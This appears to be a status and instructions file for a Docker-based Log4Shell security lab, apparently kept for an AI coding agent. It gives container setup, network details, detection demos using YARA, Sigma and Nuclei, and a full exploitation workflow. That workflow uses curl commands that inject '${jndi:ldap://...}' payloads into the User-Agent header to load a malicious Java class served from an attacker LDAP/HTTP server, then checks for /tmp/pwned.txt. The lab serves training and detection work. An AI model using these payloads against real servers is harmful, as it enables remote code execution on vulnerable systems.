# Claude Code Operating Instructions

## Current Status
- **Lab Environment**: Fully deployed with Docker containers
- **Issue**: Log4j vulnerability confirmed working, but exploitation chain needs final debugging
- **Progress**: 90% complete - LDAP/HTTP servers running, Java processing lookups, just need final connection

## Lab Components Status

### ✅ Working Components
- **Vulnerable App**: `log4shell-simple` (port 8081) - Log4j 2.14.1 processing JNDI lookups
- **LDAP Server**: `ldap-exploit-server` (port 1389) - Receiving connections and responding
- **HTTP Server**: `ldap-exploit-server` (port 8888) - Serving malicious Java class (1649 bytes)
- **Attacker Tools**: Detection rules for YARA, Sigma, Nuclei ready
- **Network**: All containers communicating properly

### 🔧 Current Issue
- LDAP server hostname was fixed from `ldap-server` to `ldap-exploit-server`
- Java stops processing JNDI after first attempts (may need app restart)
- Ready for final testing

## Container Commands

### Start/Stop Lab
```bash
# Start simple version (working one)
docker-compose -f docker-compose-simple.yml up -d

# Stop lab
docker-compose -f docker-compose-simple.yml down

# View running containers
docker ps
```

### Quick Test Commands
```bash
# Test vulnerability (should show Java version expansion)
docker exec attacker-machine curl -H "User-Agent: test_\${java:version}" http://log4shell-simple:8080

# Test exploitation
docker exec attacker-machine curl -H "User-Agent: \${jndi:ldap://ldap-exploit-server:1389/Exploit}" http://log4shell-simple:8080

# Check if exploit worked
docker exec log4shell-simple ls -la /tmp/pwned.txt
```

### Container Access
```bash
# Access attacker container
docker exec -it attacker-machine /bin/bash

# Access vulnerable app
docker exec -it log4shell-simple /bin/bash

# Access LDAP/HTTP server
docker exec -it ldap-exploit-server /bin/bash
```

### Log Monitoring
```bash
# Watch vulnerable app logs
docker logs log4shell-simple -f

# View LDAP server activity
docker logs ldap-exploit-server | tail -20

# Check for HTTP requests
docker logs ldap-exploit-server | grep -E "(GET|Serving|8888)"
```

## Network Information
- **Network**: `proxylogonlab_log4shell-net`
- **Vulnerable App**: `172.18.0.3:8080` (exposed as `localhost:8081`)
- **LDAP Server**: `172.18.0.2:1389` (hostname: `ldap-exploit-server`)
- **HTTP Server**: `172.18.0.2:8888`
- **Attacker**: `172.18.0.4`

## Exploitation Workflow

### 1. Start Callback Listener
```bash
docker exec -it attacker-machine /bin/bash
cd /tools
python3 listener.py
# Leave running in terminal 1
```

### 2. Run Exploitation
```bash
# In terminal 2
docker exec -it attacker-machine /bin/bash
cd /tools
python3 exploit.py
# Or manual test:
# curl -H "User-Agent: \${jndi:ldap://ldap-exploit-server:1389/Exploit}" http://log4shell-simple:8080
```

### 3. Check Success
```bash
# Should create /tmp/pwned.txt
docker exec log4shell-simple ls -la /tmp/pwned.txt

# Should show callback in listener
# Should show LDAP connections in logs
```

## Detection Tools

### Run All Detection
```bash
docker exec -it attacker-machine /bin/bash
cd /tools
python3 detect.py
```

### Manual Detection
```bash
# YARA scanning
yara -r /detection-rules/log4shell.yar /logs

# Nuclei scanning
nuclei -t /detection-rules/log4shell-nuclei.yaml -u http://log4shell-simple:8080

# Sigma analysis (manual log review)
cat /app/logs/application.log | grep -E "jndi|JNDI"
```

## Troubleshooting

### If Exploitation Fails
1. **Restart vulnerable app**: `docker restart log4shell-simple`
2. **Check LDAP server**: `docker exec ldap-exploit-server ps aux | grep python`
3. **Test HTTP server**: `docker exec attacker-machine python3 -c "import requests; print(requests.get('http://ldap-exploit-server:8888/Exploit.class').status_code)"`
4. **Verify hostname resolution**: `docker exec log4shell-simple nslookup ldap-exploit-server`

### If Containers Won't Start
```bash
docker-compose -f docker-compose-simple.yml down
docker-compose -f docker-compose-simple.yml up -d --build
```

### Reset Everything
```bash
docker-compose -f docker-compose-simple.yml down -v
docker system prune -f
docker-compose -f docker-compose-simple.yml up -d --build
```

## Next Steps (Tomorrow)
1. **Restart vulnerable app**: `docker restart log4shell-simple`
2. **Test basic JNDI**: Verify `${java:version}` still expands
3. **Run exploitation**: Should work with fixed hostname
4. **Verify success**: Look for `/tmp/pwned.txt` and HTTP GET requests
5. **Run detection demos**: Show YARA, Sigma, Nuclei detection
6. **Document findings**: Create final exploitation report

## File Locations
- **Lab Files**: `~/log4shell-security-lab/`
- **Detection Rules**: `./detection-rules/`
- **Exploitation Scripts**: `./attacker/`
- **Vulnerable Apps**: `./vulnerable-app/` and `./vulnerable-simple/`
- **LDAP Server**: `./ldap-exploit/`

## GitHub Repository
- **URL**: https://github.com/hasamba/ProxyLogonLab
- **Status**: All files committed and pushed
- **Last Update**: Fixed LDAP hostname from `ldap-server` to `ldap-exploit-server`

## Notes
- **Java Version**: OpenJDK 1.8.0_181 (vulnerable)
- **Log4j Version**: 2.14.1 (vulnerable)
- **Exploit Class**: Compiled and ready (1649 bytes)
- **HTTP Server**: Confirmed serving class file
- **LDAP Server**: Fixed hostname, ready for connections
- **Ready for final testing**: Just need container restart and re-test